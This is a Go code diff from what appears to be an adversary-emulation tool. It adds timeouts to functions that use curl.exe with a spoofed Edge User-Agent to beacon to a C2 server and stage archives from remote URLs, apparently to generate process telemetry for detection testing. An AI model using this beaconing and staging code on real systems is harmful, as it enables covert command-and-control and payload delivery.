@@ -24,6 +24,7 @@ package main
 
 import (
 	"bytes"
+	"context"
 	"encoding/base64"
 	"encoding/binary"
 	"fmt"
@@ -137,16 +138,22 @@ func performTechnique() error {
 
 // curlBeacon delivers the registration beacon with the system curl.exe
 // (spoofed Edge User-Agent), matching the curl.exe tradecraft used across
-// the chain. Verifies the response carried the C2 acknowledgment marker.
+// the chain. --max-time bounds every attempt. Verifies the response carried
+// the C2 acknowledgment marker.
 func curlBeacon(url string) error {
+	ctx, cancel := context.WithTimeout(context.Background(), 40*time.Second)
+	defer cancel()
 	curlPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "curl.exe")
-	cmd := exec.Command(curlPath, "-s", "-S", "--fail", "-A", SPOOFED_UA, "-o", filepath.Join(LOG_DIR, "beacon_response.txt"), "-w", "%{http_code}", url)
+	cmd := exec.CommandContext(ctx, curlPath, "-s", "-S", "--max-time", "30", "--fail", "-A", SPOOFED_UA, "-o", filepath.Join(LOG_DIR, "beacon_response.txt"), "-w", "%{http_code}", url)
 	var httpCode bytes.Buffer
 	cmd.Stdout = &httpCode
 	errOut := new(bytes.Buffer)
 	cmd.Stderr = errOut
 	err := cmd.Run()
 	LogProcessExecution("curl.exe", fmt.Sprintf("curl.exe -A <spoofed-edge-ua> %s", url), pidOf(cmd), err == nil, exitCodeOf(err), strings.TrimSpace(errOut.String()))
+	if ctx.Err() == context.DeadlineExceeded {
+		return fmt.Errorf("beacon did not return within 40s")
+	}
 	if err != nil {
 		return fmt.Errorf("curl beacon exited %d: %s", exitCodeOf(err), strings.TrimSpace(errOut.String()))
 	}
@@ -168,12 +175,17 @@ func utf16LE(s string) []byte {
 }
 
 // curlFetch stages an archive with the system curl.exe so the fetch
-// generates real process telemetry.
+// generates real process telemetry. --max-time bounds every fetch.
 func curlFetch(url, dest string) error {
-	cmd := exec.Command(filepath.Join(os.Getenv("SystemRoot"), "System32", "curl.exe"),
-		"-s", "-S", "-o", dest, url)
+	ctx, cancel := context.WithTimeout(context.Background(), 45*time.Second)
+	defer cancel()
+	cmd := exec.CommandContext(ctx, filepath.Join(os.Getenv("SystemRoot"), "System32", "curl.exe"),
+		"-s", "-S", "--max-time", "30", "-o", dest, url)
 	out, err := cmd.CombinedOutput()
-	LogProcessExecution("curl.exe", fmt.Sprintf("curl.exe -s -S -o %s %s", dest, url), pidOf(cmd), err == nil, exitCodeOf(err), strings.TrimSpace(string(out)))
+	LogProcessExecution("curl.exe", fmt.Sprintf("curl.exe -s -S --max-time 30 -o %s %s", dest, url), pidOf(cmd), err == nil, exitCodeOf(err), strings.TrimSpace(string(out)))
+	if ctx.Err() == context.DeadlineExceeded {
+		return fmt.Errorf("curl fetch of %s did not return within 45s", dest)
+	}
 	if err != nil {
 		return fmt.Errorf("curl.exe exited %d: %s", exitCodeOf(err), strings.TrimSpace(string(out)))
 	}
